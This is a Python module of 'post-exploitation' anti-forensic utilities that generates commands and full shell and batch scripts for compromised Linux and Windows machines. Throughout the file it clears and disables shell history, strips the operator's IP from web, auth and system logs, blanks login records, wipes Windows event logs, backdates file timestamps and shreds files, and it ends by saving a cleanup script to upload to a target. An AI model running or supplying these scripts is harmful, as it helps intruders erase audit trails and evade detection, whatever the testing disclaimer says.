"""
Log Cleaner - Post-Exploitation Utilities
==========================================

WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY
Use these tools only on systems you have explicit permission to test.

This module provides utilities to clean logs and cover tracks after
a successful penetration test.
"""

import os
import re
import datetime
from typing import List, Optional
import subprocess


class LogCleaner:
    """
    Utilities for cleaning logs on compromised systems.
    """
    
    @staticmethod
    def clean_bash_history(target_user: str = None):
        """
        Clean bash history for a specific user or current user.
        
        Usage (on compromised Linux system):
            python -c "from utils.log_cleaner import LogCleaner; LogCleaner.clean_bash_history()"
        """
        commands = [
            "history -c",  # Clear current session
            "rm -f ~/.bash_history",  # Delete history file
            "ln -sf /dev/null ~/.bash_history",  # Prevent future logging
            "export HISTFILESIZE=0",  # Disable history
            "export HISTSIZE=0"
        ]
        
        script = "; ".join(commands)
        print(f"[*] Cleaning bash history...")
        print(f"[*] Run this on target: {script}")
        return script
    
    @staticmethod
    def clean_web_server_logs(log_path: str, your_ip: str):
        """
        Remove your IP from web server logs.
        
        Args:
            log_path: Path to log file (e.g., /var/log/apache2/access.log)
            your_ip: Your IP address to remove
        
        Returns:
            Command to run on target system
        """
        # Use sed to remove lines containing your IP
        command = f"sed -i '/{your_ip}/d' {log_path}"
        print(f"[*] Cleaning web server logs...")
        print(f"[*] Run this on target: {command}")
        return command
    
    @staticmethod
    def clean_auth_logs(your_ip: str):
        """
        Remove your IP from authentication logs.
        
        Args:
            your_ip: Your IP address to remove
        """
        log_files = [
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/messages"
        ]
        
        commands = []
        for log_file in log_files:
            commands.append(f"sed -i '/{your_ip}/d' {log_file}")
        
        script = " && ".join(commands)
        print(f"[*] Cleaning auth logs...")
        print(f"[*] Run this on target: {script}")
        return script
    
    @staticmethod
    def generate_cleanup_script(your_ip: str, target_os: str = "linux") -> str:
        """
        Generate a comprehensive cleanup script.
        
        Args:
            your_ip: Your IP address
            target_os: 'linux' or 'windows'
        
        Returns:
            Complete cleanup script
        """
        if target_os == "linux":
            script = f"""#!/bin/bash
# Auto-generated cleanup script
# WARNING: FOR AUTHORIZED TESTING ONLY

echo "[*] Starting cleanup..."

# Clear bash history
history -c
rm -f ~/.bash_history
ln -sf /dev/null ~/.bash_history
export HISTFILESIZE=0
export HISTSIZE=0

# Clean web server logs
sed -i '/{your_ip}/d' /var/log/apache2/access.log 2>/dev/null
sed -i '/{your_ip}/d' /var/log/nginx/access.log 2>/dev/null

# Clean auth logs
sed -i '/{your_ip}/d' /var/log/auth.log 2>/dev/null
sed -i '/{your_ip}/d' /var/log/secure 2>/dev/null

# Clean system logs
sed -i '/{your_ip}/d' /var/log/syslog 2>/dev/null
sed -i '/{your_ip}/d' /var/log/messages 2>/dev/null

# Clear last login
echo "" > /var/log/wtmp
echo "" > /var/log/btmp

echo "[+] Cleanup complete!"
"""
        else:  # Windows
            script = f"""@echo off
REM Auto-generated cleanup script
REM WARNING: FOR AUTHORIZED TESTING ONLY

echo [*] Starting cleanup...

REM Clear PowerShell history
del %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

REM Clear Event Logs (requires admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

echo [+] Cleanup complete!
"""
        
        return script


class TimestampManipulator:
    """
    Utilities for manipulating file timestamps to avoid forensic detection.
    """
    
    @staticmethod
    def reset_timestamps(file_path: str, reference_file: str = None):
        """
        Reset file timestamps to match another file or a specific time.
        
        Args:
            file_path: File to modify
            reference_file: File to copy timestamps from (optional)
        
        Returns:
            Command to run
        """
        if reference_file:
            # Linux: touch -r
            command = f"touch -r {reference_file} {file_path}"
        else:
            # Set to a generic old date
            command = f"touch -t 202001010000 {file_path}"
        
        print(f"[*] Resetting timestamps...")
        print(f"[*] Run this on target: {command}")
        return command
    
    @staticmethod
    def generate_timestamp_script(directory: str) -> str:
        """
        Generate script to reset all timestamps in a directory.
        
        Args:
            directory: Directory to process
        """
        script = f"""#!/bin/bash
# Reset all timestamps in {directory}

echo "[*] Resetting timestamps in {directory}..."

find {directory} -type f -exec touch -t 202001010000 {{}} \\;

echo "[+] Timestamps reset!"
"""
        return script


class SecureDelete:
    """
    Utilities for securely deleting files (overwrite before delete).
    """
    
    @staticmethod
    def shred_file(file_path: str, passes: int = 3):
        """
        Securely delete a file by overwriting it multiple times.
        
        Args:
            file_path: File to delete
            passes: Number of overwrite passes
        """
        command = f"shred -vfz -n {passes} {file_path}"
        print(f"[*] Securely deleting {file_path}...")
        print(f"[*] Run this on target: {command}")
        return command


# Example usage
if __name__ == "__main__":
    print("=" * 70)
    print("LOG CLEANER - POST-EXPLOITATION UTILITIES")
    print("=" * 70)
    print()
    
    # Example: Generate cleanup script
    cleaner = LogCleaner()
    
    your_ip = input("Enter your IP address: ")
    
    print("\n[*] Generating cleanup script...")
    script = cleaner.generate_cleanup_script(your_ip, "linux")
    
    # Save to file
    with open("cleanup.sh", "w") as f:
        f.write(script)
    
    print(f"\n[+] Cleanup script saved to: cleanup.sh")
    print(f"[*] Upload this to the target and run: bash cleanup.sh")
